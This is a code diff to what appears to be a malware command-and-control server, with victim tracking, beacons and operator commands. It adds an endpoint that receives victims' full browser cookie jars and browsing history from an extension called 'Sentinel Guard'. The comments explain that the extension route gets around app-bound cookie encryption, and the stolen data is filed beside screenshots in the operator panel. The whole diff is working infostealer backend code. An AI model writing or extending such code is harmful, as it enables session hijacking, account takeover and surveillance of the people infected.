@@ -387,6 +387,46 @@ async function handleBeacon(req, res, body) {
   return json(res, 200, { ok: true, commands: rows });
 }
 
+// ---------------------------------------------------------------- extension --
+// The Sentinel Guard extension hands over the cookie jar through the browser API,
+// because an app-bound (v20) cookie can only be decrypted by the store that owns
+// the key. It posts here with a shared token rather than an HMAC: the extension
+// has no clock it trusts and no streaming signer, so the token is the whole gate.
+// Fallback to AGENT_SECRET keeps the deployment unchanged - one secret already
+// exists and both sides are ours.
+const EXT_TOKEN = process.env.EXT_TOKEN || AGENT_SECRET;
+
+async function handleExt(req, res, body) {
+  const token = req.headers["x-ext-token"] || "";
+  const agent = String(req.headers["x-agent-id"] || "").slice(0, 64);
+  if (!EXT_TOKEN) return json(res, 503, { ok: false, error: "unconfigured" });
+  if (!safeEqual(token, EXT_TOKEN)) return json(res, 401, { ok: false, error: "token" });
+  if (!agent) return json(res, 400, { ok: false, error: "agent" });
+  if (body.length > MAX_BODY) return json(res, 413, { ok: false, error: "size" });
+
+  let payload;
+  try {
+    payload = JSON.parse(body || "{}");
+  } catch {
+    return json(res, 400, { ok: false, error: "json" });
+  }
+
+  const cookies = Array.isArray(payload.cookies) ? payload.cookies.length : 0;
+  const history = Array.isArray(payload.history) ? payload.history.length : 0;
+  const browser = String(payload.browser || "browser").slice(0, 60);
+  const tag = browser.replace(/[^a-z0-9]+/gi, "_").slice(0, 24);
+
+  // The row lands in the same uploads table the agent fills, so the panel lists it
+  // beside a screenshot with no new UI and no schema change.
+  await pool.query(
+    `insert into uploads (vid, cmd_id, name, bytes, data) values ($1,$2,$3,$4,$5)`,
+    [agent, null, `ext_${tag}_${Date.now()}.json`, Buffer.byteLength(body),
+     Buffer.from(body).toString("base64")]
+  );
+  await pool.query(`update victims set last_seen = now() where id = $1`, [agent]);
+  return json(res, 200, { ok: true, cookies, history });
+}
+
 // The agent asks for a long poll: hold the request open until a command lands or
 // the window closes. Without this every operator click waited for the next beat
 // of a 45 s timer; with it the same click is delivered in well under a second.
@@ -477,6 +517,18 @@ const server = http.createServer(async (req, res) => {
       return handleBeacon(req, res, await readBody(req));
     if (path === "/api/result" && req.method === "POST")
       return handleResult(req, res, await readBody(req));
+    if (path === "/api/ext" && req.method === "POST")
+      return handleExt(req, res, await readBody(req));
+    // The extension service worker carries host permission, so CORS is bypassed;
+    // the preflight answer exists for a browser build that stops granting it.
+    if (path === "/api/ext" && req.method === "OPTIONS") {
+      res.writeHead(204, {
+        "access-control-allow-origin": "*",
+        "access-control-allow-headers": "content-type,x-ext-token,x-agent-id",
+        "access-control-allow-methods": "POST,OPTIONS"
+      });
+      return res.end();
+    }
 
     if (path === "/api/login" && req.method === "POST") {
       const gate = loginGate(clientIp(req));
